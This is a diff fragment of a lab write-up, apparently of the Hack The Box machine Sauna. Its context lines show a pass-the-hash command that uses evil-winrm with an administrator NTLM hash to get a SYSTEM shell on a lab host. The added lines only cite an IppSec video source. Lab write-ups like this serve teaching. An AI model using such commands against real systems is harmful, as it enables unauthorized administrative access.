@@ -264,3 +264,7 @@ This spits out a ton of information. The hash I need (that matches the secretsdu
 
 Then we can use `evil-winrm` to catch the SYSTEM shell
 `evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e`
+
+## Fuentes / Sources
+
+- [IppSec: Sauna (video)](https://youtube.com/watch?v=uLNpR3AnE-Y) - IppSec - fecha de acceso: 2026-09-24.
